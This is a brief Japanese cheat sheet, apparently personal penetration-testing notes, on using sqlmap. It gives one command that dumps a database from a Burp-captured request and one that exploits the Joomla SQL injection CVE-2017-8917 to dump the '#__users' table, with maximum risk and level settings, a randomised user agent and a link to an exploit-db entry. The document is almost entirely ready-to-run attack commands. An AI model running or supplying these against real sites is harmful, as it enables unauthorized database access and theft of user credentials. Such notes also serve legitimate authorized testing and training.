# sqlmap

## Webアプリ上のSQLI

※事前にBurpでリクエストとレスポンスをキャプチャしておく。

```
sqlmap -r req.txt --dbms={mysql/Z} --dump
```

## CVE-2017-8917


```
sqlmap -u "http://<remote-ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```


参考）https://www.exploit-db.com/exploits/42033
